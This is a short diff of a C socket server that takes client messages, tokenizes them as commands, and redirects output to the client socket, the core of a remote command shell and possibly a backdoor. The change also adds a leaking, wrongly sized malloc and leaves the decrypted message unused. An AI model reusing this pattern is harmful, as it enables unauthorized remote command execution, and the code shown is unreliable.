@@ -57,16 +57,17 @@ int main() {
 				recv(client_socket, &client_message, sizeof(client_message), 0);
 				printf("recieved:<%s> from the client. \n", client_message);
 				int length = find_length(client_message);
-				char decrypted_client_message = t_decrypt(client_message, length);
+				char * decrypted_client_message = (char *) malloc(sizeof(char *) * length);
+				decrypted_client_message = t_decrypt(client_message, length);
 				
-				if(strcmp(decrypted_client_message, "exit") == 0) {
+				if(strcmp(client_message, "exit") == 0) {
 					//local_persist = 0;
 					printf("Exiting Process.");
 			
 				} else {
 					/* tokenize the command from the client */
 					char **tokens;
-				       	tokens = tokenize(decrypted_client_message);
+				       	tokens = tokenize(client_message);
 				
 					/* change the stderr and stdout to the client socket */
 					dup2(client_socket, STDOUT_FILENO);
